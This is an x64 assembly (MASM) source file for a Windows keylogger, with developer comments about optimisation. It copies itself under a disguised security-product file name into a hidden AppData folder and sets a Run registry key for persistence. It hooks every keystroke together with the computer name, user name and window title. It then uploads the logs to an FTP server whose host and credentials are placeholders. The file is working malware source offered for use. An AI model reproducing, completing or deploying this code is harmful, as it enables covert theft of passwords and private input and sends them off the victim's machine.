includelib \masm64\lib\kernel32.lib
includelib \masm64\lib\user32.lib
includelib \masm64\lib\advapi32.lib
includelib \masm64\lib\wininet.lib
extern GetProcessHeap :proc
extern HeapAlloc :proc
extern GetModuleFileNameA :proc
extern CreateDirectoryA :proc
extern SetFileAttributesA :proc
extern GetEnvironmentVariableA :proc
extern CopyFileA :proc
extern RegOpenKeyExA :proc
extern RegSetValueExA :proc
extern InternetOpenA :proc
extern InternetConnectA :proc
extern RegCreateKeyExA :proc
extern RegQueryValueExA :proc
extern FtpCreateDirectoryA :proc
extern CryptAcquireContextA :proc
extern CryptGenRandom :proc
extern GetSystemTime :proc
extern FtpPutFileA :proc
extern DeleteFileA :proc
extern CreateFileA :proc
extern SetWindowsHookExA :proc
extern GetMessageA :proc
extern GetForegroundWindow :proc
extern GetComputerNameExA :proc
extern GetUserNameA :proc
extern GetWindowTextA :proc
extern GetKeyboardState :proc
extern GetKeyState :proc
extern ToAscii :proc
extern GetKeyNameTextA :proc
extern WriteFile :proc
extern CallNextHookEx :proc
extern ExitProcess :proc

MAX_PATH equ 260
MAX_COMPUTERNAME_LENGTH equ 15
UNLEN equ 256
FILE_ATTRIBUTE_HIDDEN equ 2h
FILE_ATTRIBUTE_SYSTEM equ 4h
KEY_SET_VALUE equ 2h
HKEY_CURRENT_USER equ 80000001h
REG_SZ equ 1
FILE_ATTRIBUTE_NORMAL equ 80h
GENERIC_READ equ 80000000h
GENERIC_WRITE equ 40000000h
INTERNET_FLAG_PASSIVE equ 8000000h
INTERNET_SERVICE_FTP equ 1
INTERNET_DEFAULT_FTP_PORT equ 21
KEY_QUERY_VALUE equ 1h
KEY_CREATE_SUB_KEY equ 4h
PROV_RSA_FULL equ 1
FTP_TRANSFER_TYPE_BINARY equ 2
OPEN_EXISTING equ 3
OPEN_ALWAYS equ 4
TRUNCATE_EXISTING equ 5
FILE_APPEND_ACCESS equ 4h
INVALID_HANDLE_VALUE equ -1
WH_KEYBOARD_LL equ 13
WM_KEYUP equ 101h
WM_SYSKEYUP equ 105h
VK_CAPITAL equ 14h
VK_LSHIFT equ 0a0h
VK_RSHIFT equ 0a1h
VK_BACK equ 8h
VK_ESCAPE equ 1bh
VK_RETURN equ 0dh
VK_TAB equ 9h
VK_SHIFT equ 10h

.data
lpName db 'AppData', 0
lpPathName db '\Startup', 0                             ;must stay intact with items below
lpFileName db '\ccsvchst.exe', 0                        ;do not rearrange
lpFileName1 db '\logfile.txt', 0                        ;do not rearrange
lpszDirectory db 0                                      ;must be zero if not provided
lpSubKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
lpValueName db 'Startup', 0
lpSubKey1 db 'Software\Startup', 0
lpValueName1 db 'id', 0
lpszPassword db 'YOUR_PASSWORD_HERE', 0
lpszUsername db 'YOUR_USERNAME_HERE', 0
lpszServerName db 'YOUR_SERVER_NAME_HERE', 0

.code
start proc                                              ;start proc still needs to be optimized
  sub rsp, 28h
  
  call GetProcessHeap
  
  mov r13, MAX_PATH+MAX_COMPUTERNAME_LENGTH+UNLEN+2 ;check if more space needed for optimization
  
  lea r8, [r13+r13]                                     ;WARNING, optimize to lea r8, [rbp+rbp]
  xor edx, edx                                            ;can be null, implied in doc
  mov ecx, eax
  call HeapAlloc
  
  push rax
  pop rbx
  
  mov r8d, r13d
  push rbx
  pop rdx
  lea rcx, lpName
  call GetEnvironmentVariableA
  
  mov rcx, sizeof lpPathName
  lea rsi, lpPathName
  lea rdi, [rbx+rax]
  rep movs byte ptr [rdi], byte ptr [rsi]
  
  xor rdx, rdx
  push rbx
  pop rcx
  call CreateDirectoryA
  
  xor edx, edx                                            ;optimized
  mov dl, FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM
  push rbx
  pop rcx
  call SetFileAttributesA
  
  mov rcx, sizeof lpFileName                              ;consider storing sizeof lpFileName in variable
  dec rdi
  rep movs byte ptr [rdi], byte ptr [rsi]                 ;check order of register use for elegance
  
  lea rbp, [rbx+r13]
  
  mov r8d, r13d
  push rbp
  pop rdx
  xor ecx, ecx
  call GetModuleFileNameA
  
  xor r8d, r8d
  push rbx
  pop rdx
  push rbp
  pop rcx
  call CopyFileA
  
  mov r12, 20h
  
  mov qword ptr [rsp+r12], rdi
  mov r9d, KEY_SET_VALUE
  xor r8d, r8d
  lea rdx, lpSubKey
  mov ecx, HKEY_CURRENT_USER
  call RegOpenKeyExA
  
  push rdi
  pop rax
  sub rax, rbx
  push rax
  push rbx
  sub rsp, r12
  mov r9d, REG_SZ
  xor r8d, r8d
  lea rdx, lpValueName
  mov ecx, dword ptr [rdi]
  call RegSetValueExA
  
  mov rcx, sizeof lpFileName1
  sub rdi, sizeof lpFileName
  rep movs byte ptr [rdi], byte ptr [rsi]
  
  mov rcx, sizeof lpszDirectory
  push rbp
  pop rdi
  rep movs byte ptr [rdi], byte ptr [rsi]
  
  xor r9, r9
  mov [rsp+r12], r9
  xor r8, r8                                              ;check mov register-to-register optimization
  xor edx, edx
  push rsi                                                ;mov rcx, offset lpszAgent
  pop rcx                                                 ;WARNING
  call InternetOpenA
  
  mov ecx, eax
  push rax                                                ;check if parameter is optional
  mov eax, INTERNET_FLAG_PASSIVE
  push rax
  xor eax, eax
  inc al
  push rax
  lea rax, lpszPassword
  push rax
  sub rsp, r12
  lea r9, lpszUsername
  mov r8w, INTERNET_DEFAULT_FTP_PORT
  lea rdx, lpszServerName
  call InternetConnectA
  
  mov r13d, eax
  
  test eax, eax
  je open_file
  
reg_create_key:
  push rax
  push rsi
  push rdi
  xor r8, r8
  push r8
  mov eax, KEY_QUERY_VALUE+KEY_SET_VALUE+KEY_CREATE_SUB_KEY
  push rax
  push r8
  sub rsp, r12
  lea rdx, lpSubKey1
  mov ecx, HKEY_CURRENT_USER
  call RegCreateKeyExA
  
  lods dword ptr [rsi]
  dec eax
  je reg_create_key
  
  mov byte ptr -1[rdi], '/'
  
  lea rdx, lpValueName1                                   ;mov ecx, phkResult
  mov r14, rdx
  mov ecx, dword ptr [rdi]
  mov r15d, ecx
  
  mov byte ptr [rsp], 0bh
  push rsp
  push rdi
  sub rsp, r12
  xor r9, r9
  xor r8, r8
  call RegQueryValueExA
  
  mov byte ptr 0ah[rdi], 0
  
  test rax, rax
  je ftp_put_file                                         ;could also be ftp_create_directory
  
  xor rdx, rdx
  mov dword ptr [rsp+r12], edx
  mov r9d, PROV_RSA_FULL
  xor r8, r8
  push rsi                                                ;lea rcx, phProv
  pop rcx
  call CryptAcquireContextA
  
  mov r8, rdi                                             ;lea r8, pbBuffer
  mov edx, 4
  mov ecx, dword ptr [rsi]                                ;mov ecx, dword ptr phProv
  call CryptGenRandom
  
  std
  xor rcx, rcx
  mov cl, 0ah
  mov eax, dword ptr [rdi]
  add rdi, 9
  call to_ascii
  
  cld
  inc rdi
  
  push rbp                                                ;consider adding a label here
  pop rdx
  mov ecx, r13d
  call FtpCreateDirectoryA
  
  test al, al                                             ;questionable code
  je ftp_put_file
  
  mov eax, 0bh
  push rax                                                ;push rax
  push rdi
  sub rsp, r12
  mov r9d, REG_SZ
  xor r8d, r8d
  mov rdx, r14                                            ;lea rdx, lpValueName1 ;consider storing variable in register
  mov ecx, r15d
  call RegSetValueExA
  
ftp_put_file:
  push rsi
  pop rcx
  call GetSystemTime
  
  lods dword ptr [rsi]
  mov dword ptr -2[rsi], eax                             ;sub rsi, 2
  
  std
  xor rcx, rcx
  add rsi, 8                                              ;changed from 0ah
  add rdi, 1ah                                            ;10h+0bh ;check accuracy systime original: 10h
  
  mov dword ptr 1[rdi], 747874h                           ;'txt', 0
  
  mov cl, 2
  mov dl, '.'
outer_loop:
  mov al, dl
  stos byte ptr [rdi]
  
  push rcx
  mov cl, 3
  xor eax, eax
inner_loop:
  push rcx                                                ;manual push
  mov cl, 2
  lods word ptr [rsi]
  call to_ascii
  pop rcx                                                 ;manual pop
  loopne inner_loop
  pop rcx
  
  mov dl, '_'
  loopne outer_loop
  
  mov cl, 2
  call to_ascii
  
  mov byte ptr [rdi], '/'                                 ;check optimization
  
  cld
  ;fifth parameter neglected here
  mov r9d, FTP_TRANSFER_TYPE_BINARY
  mov r8, rbp                                             ;change to systime when combining alpha / beta
  push rbx
  pop rdx
  mov ecx, r13d
  call FtpPutFileA
  
  dec al                                                  ;test al, al
  jne open_file                                           ;je open_file
  
  push rbx
  pop rcx
  call DeleteFileA
  
open_file:
  lea rsi, lpSubKey+4                                   ;recycle buffer to store various handles
  
  xor ecx, ecx
  mov cl, OPEN_EXISTING
  
create_file:
  mov dword ptr [rsi], eax                                ;mov dwFail, eax
  xor eax, eax
  push rax                                                ;this block of code will be repositioned below FtpPutFile
  xor r9, r9
  push r9
  xor eax, eax
  mov al, FILE_ATTRIBUTE_NORMAL
  push rax
  push rcx
  sub rsp, r12
  mov r8d, 3                                              ;this parameter must be null for final release
  xor edx, edx
  mov dl, FILE_APPEND_ACCESS
  push rbx
  pop rcx
  call CreateFileA                                        ;check share mode for conflicts below
  
  mov dword ptr 4[rsi], eax                               ;mov hFile, eax ;must save handle here (maybe)
  
  xor ecx, ecx
  mov cl, OPEN_ALWAYS
  inc eax                                                 ;cmp eax, INVALID_HANDLE_VALUE ;can be optimized
  je create_file
  
  mov qword ptr 8[rsi], rbx                               ;mov lpBuffer, rbp ;can be optimized
  
  xor r9d, r9d
  xor r8d, r8d                                            ; mov r8d, eax
  lea rdx, LowLevelKeyboardProc
  xor ecx, ecx
  mov cl, WH_KEYBOARD_LL
  call SetWindowsHookExA
  
message_loop:
  xor r9d, r9d
  xor r8d, r8d
  xor edx, edx
  mov rcx, rbx                                            ;WARNING MSG in rbx
  call GetMessageA
  
  test eax, eax
  jne message_loop
  
exit:
  xor ecx, ecx
  call ExitProcess
start endp
  
to_ascii:
  push rbx
next_byte:
  xor edx, edx
  mov ebx, 0ah                                            ;WARNING uses ebx
  div ebx
  xchg al, dl
  add al, 30h                                             ;add al, 30h
  stos byte ptr [rdi]
  mov al, dl
  loopne next_byte
  pop rbx
  ret
  
LowLevelKeyboardProc proc nCode:dword, wParam:dword, lParam:qword ;check HookProc format
  push rbx
  push rcx
  push rdx
  push rsi
  push rdi
  push rbp                                                ;check prolog / epilog format, rbx may need to be saved
  mov rbp, r8
  push r8
  push r12
  push r13
  push r14
  sub rsp, 20h                                            ;check if code block needs to be repositioned above
  ;check if nCode is zero (HC_ACTION), if so, continue
  test ecx, ecx                                           ;check correct usage of instruction, may change according to WinAPI
  jl next_hook
  
  cmp edx, WM_KEYUP
  je next_hook
  cmp edx, WM_SYSKEYUP
  je next_hook
  
  push rbp
  pop rsi
  lods dword ptr [rsi]
  cmp ax, VK_CAPITAL
  je next_hook
  cmp ax, VK_LSHIFT                                       ;check space optimization against al
  je next_hook
  cmp ax, VK_RSHIFT
  je next_hook
  
  mov r12, offset lpSubKey+4
  mov rbx, qword ptr 8[r12]                               ;lpKeyState ;WARNING
  mov rsi, MAX_PATH+MAX_COMPUTERNAME_LENGTH+UNLEN+2 ;mov esi, 260
  lea rdi, [rbx+rsi]
  mov r13, rdi
  
  call GetForegroundWindow
  
  xor ecx, ecx
  cmp ecx, dword ptr 10h[r12]
  mov dword ptr 10h[r12], ecx
  jne window_change
  
  cmp dword ptr 14h[r12], eax                             ;cmp hWnd, eax ;check cmpxchg optimization
  je no_window_change
  
window_change:
  mov dword ptr 14h[r12], eax                             ;hWnd, eax
  mov r14d, eax
  
  mov eax, dword ptr [r12]                                ;dwFail
  
  test eax, eax                                           ;buggy
  je skip_carriage
  mov eax, 0a0d0a0dh                                      ;little-endian
  stos dword ptr [rdi]
  
skip_carriage:
  mov dword ptr [r12], esi                                ;dwFail, esi
  mov dword ptr [rbx], esi
  mov r8, rbx
  push rdi
  pop rdx
  xor ecx, ecx
  inc ecx                                                 ;check correct size of parameter
  call GetComputerNameExA
  
  xor rax, rax
  mov eax, dword ptr [rbx]
  add rdi, rax                                            ;check base pointer first optimization
  
  mov al, '|'
  stos byte ptr [rdi]
  
  mov dword ptr [rbx], esi
  push rbx
  pop rdx
  push rdi
  pop rcx
  call GetUserNameA
  
  xor rax, rax
  mov eax, dword ptr [rbx]                                ;can be optimized, pre-initialize leading zeroes
  lea rdi, -1[rdi+rax]
  
  mov al, '|'
  stos byte ptr [rdi]
  
  mov r8d, esi
  push rdi
  pop rdx
  mov ecx, r14d
  call GetWindowTextA
  
  xor rcx, rcx
  mov ecx, eax
  add rdi, rcx                                            ;check base pointer first optimization
  
  mov ax, 0a0dh                                           ;little-endian
  stos word ptr [rdi]
  ;mov rbp, r8 ;could use push / pop optimization by rearranging prolog
no_window_change:
  push rbp
  pop rsi
  lods dword ptr [rsi]
  cmp ax, VK_BACK
  je get_key_name
  cmp ax, VK_ESCAPE
  je get_key_name
  cmp ax, VK_RETURN
  je get_key_name
  cmp ax, VK_TAB
  je get_key_name
  
  push rbx
  pop rcx
  call GetKeyboardState
  
  mov ecx, VK_CAPITAL
  call GetKeyState
  
  mov byte ptr VK_CAPITAL[rbx], al
  
  mov ecx, VK_SHIFT
  call GetKeyState
  
  xor ah, ah                                              ;VK_CONTROL optimization trick
  mov word ptr VK_SHIFT[rbx], ax
  
  xor eax, eax
  mov dword ptr 20h[rsp], eax
  mov r9, rdi
  mov r8, rbx
  push rbp
  pop rsi
  lods dword ptr [rsi]
  mov ecx, eax
  lods dword ptr [rsi]
  mov edx, eax
  call ToAscii
  
  dec eax
  je write_file
  
get_key_name:
  mov al, '['
  stos byte ptr [rdi]
  
  push rbp
  pop rsi
  lods dword ptr [rsi]
  lods dword ptr [rsi]
  shl eax, 16
  mov ecx, eax
  lods dword ptr [rsi]
  shl eax, 24
  or ecx, eax
  mov r8d, 10h
  push rdi
  pop rdx
  call GetKeyNameTextA
  
  mov byte ptr [rdi+rax], ']'
  
write_file:
  xor rcx, rcx
  mov ecx, eax
  lea r8, 1[rdi+rcx]
  sub r8, r13
  mov rdi, r13
  
  xor r9, r9                                              ;mov r9, offset msg1 ;WARNING
  mov qword ptr 20h[rsp], r9                              ;rax
  push rdi
  pop rdx
  mov ecx, dword ptr 4[r12]                               ;hFile
  call WriteFile
  
next_hook:
  add rsp, 20h                                            ;xor ecx, ecx moved below
  pop r14
  pop r13
  pop r12
  pop r8
  pop rbp
  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rbx
  
  sub rsp, 20h
  xor ecx, ecx
  call CallNextHookEx
  add rsp, 20h
  ret
LowLevelKeyboardProc endp
end
